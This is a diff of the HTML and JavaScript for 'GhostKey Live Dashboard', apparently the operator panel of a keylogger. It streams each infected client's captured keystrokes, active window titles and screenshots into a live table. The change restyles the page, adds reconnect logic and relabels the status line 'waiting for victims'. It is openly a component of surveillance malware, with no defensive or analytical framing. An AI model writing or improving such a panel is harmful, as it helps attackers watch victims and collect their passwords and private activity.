@@ -4,26 +4,27 @@
 <meta charset="UTF-8">
 <title>GhostKey Live Dashboard</title>
 <style>
-  :root{--bg:#040506;--text:#e5e5e5;--accent:#26ff80;--border:#1a1f2e}
-  body{background:var(--bg);color:var(--text);font-family:Consolas,monospace;margin:0;padding:20px}
-  .dot{width:14px;height:14px;background:var(--accent);border-radius:50%;display:inline-block;animation:pulse 2s infinite}
-  @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
-  h1{font-size:1.8em;margin-bottom:20px}
+  body{background:#000;color:#0f0;font-family:Consolas,monospace;margin:0;padding:20px;line-height:1.5}
+  h1{font-size:2em;margin:0 0 20px}
+  .dot{width:14px;height:14px;background:#0f0;border-radius:50%;display:inline-block;animation:p:2s infinite}
+  @keyframes p{0%,100%{opacity:1}50%{opacity:0.4}}
+  .status{margin:15px 0;font-size:1.2em}
+  .ok{color:#0f0}
+  .error{color:#f66}
   table{width:100%;border-collapse:collapse;margin-top:20px}
-  th{background:#111;color:#888;padding:12px;text-align:left;border-bottom:2px solid var(--border)}
-  td{padding:10px;border-bottom:1px solid #222}
-  .screenshot{width:160px;height:90px;object-fit:cover;cursor:pointer;border:2px solid #333;border-radius:8px;transition:0.2s}
-  .screenshot:hover{border-color:var(--accent);transform:scale(1.05)}
-  .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.98);justify-content:center;align-items:center;z-index:999}
-  .modal img{max-width:95%;max-height:95vh;border-radius:12px;box-shadow:0 0 40px rgba(38,255,128,0.5)}
-  .status{color:#555;text-align:center;padding:40px 0;font-size:1.1em}
+  th{background:#111;padding:10px;text-align:left}
+  td{padding:8px;border-bottom:1px solid #333}
+  .ss{width:180px;height:100px;object-fit:cover;cursor:pointer;border:2px solid #333;border-radius:6px}
+  .ss:hover{border-color:#0f0}
+  .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);justify-content:center;align-items:center;z-index:99}
+  .modal img{max-width:95%;max-height:95vh;border-radius:10px}
 </style>
 </head>
 <body>
 <h1><span class="dot"></span> GhostKey Live Dashboard</h1>
-<div class="status">Connecting to server...</div>
+<div class="status ok" id="status">Starting connection...</div>
 
-<table style="display:none">
+<table id="logtable" style="display:none">
   <thead><tr>
     <th>#</th><th>Time</th><th>Client</th><th>Window</th><th>Keys</th><th>Screenshot</th>
   </tr></thead>
@@ -31,48 +32,55 @@
 </table>
 
 <div id="modal" class="modal" onclick="this.style.display='none'">
-  <img id="full" src="">
+  <img id="big">
 </div>
 
 <script>
 let counter = 1;
 const tbody = document.getElementById("logs");
-const table = tbody.parentElement.parentElement;
-const status = document.querySelector(".status");
+const table = document.getElementById("logtable");
+const status = document.getElementById("status");
 
-const es = new EventSource("/events");
+function connect() {
+  status.textContent = "Connecting to server...";
+  status.className = "status";
 
-es.onopen = () => {
-  status.textContent = "Connected — Waiting for infected clients...";
-  table.style.display = "table";
-};
+  const es = new EventSource("/events");
 
-es.onmessage = (e) => {
-  try {
-    const d = JSON.parse(e.data);
-    const row = document.createElement("tr");
-    const ts = new Date().toISOString().slice(0,19).replace("T"," ");
+  es.onopen = () => {
+    status.textContent = "Connected — waiting for victims...";
+    status.className = "status ok";
+    table.style.display = "table";
+  };
 
-    row.innerHTML = `
-      <td>${counter++}</td>
-      <td>${ts}</td>
-      <td><strong>${d.Client || "??"}</strong></td>
-      <td>${d.Window || "Desktop"}</td>
-      <td>${(d.Keys || []).join("").substring(0,120)}${(d.Keys || []).length > 120 ? "..." : ""}</td>
-      <td>${d.Screenshot ? 
-        `<img class="screenshot" src="${d.Screenshot}" onclick="document.getElementById('full').src=this.src;document.getElementById('modal').style.display='flex'">` 
-        : "—"}</td>
-    `;
-    tbody.insertBefore(row, tbody.firstChild);
-  } catch(err) {
-    console.log("Parse error:", err);
-  }
-};
+  es.onmessage = (e) => {
+    if (e.data.trim() === "" || e.data.startsWith(":")) return; // heartbeat
+    try {
+      const d = JSON.parse(e.data);
+      const row = document.createElement("tr");
+      const ts = new Date().toISOString().slice(0,19).replace("T"," ");
+      row.innerHTML = `
+        <td>${counter++}</td>
+        <td>${ts}</td>
+        <td><b>${d.Client||"?"}</b></td>
+        <td>${d.Window||"Desktop"}</td>
+        <td>${(d.Keys||[]).join("").substring(0,150)}${(d.Keys||[]).length>150?"...":""}</td>
+        <td>${d.Screenshot ? `<img class="ss" src="${d.Screenshot}" onclick="document.getElementById('big').src=this.src;document.getElementById('modal').style.display='flex'">` : "—"}</td>
+      `;
+      tbody.insertBefore(row, tbody.firstChild);
+    } catch(e) {}
+  };
 
-es.onerror = () => {
-  status.textContent = "Connection lost — reconnecting...";
-  status.style.color = "#e74c3c";
-};
+  es.onerror = () => {
+    es.close();
+    status.textContent = "Connection lost — retrying in 3s...";
+    status.className = "status error";
+    setTimeout(connect, 3000);
+  };
+}
+
+// Start it
+connect();
 </script>
 </body>
 </html>
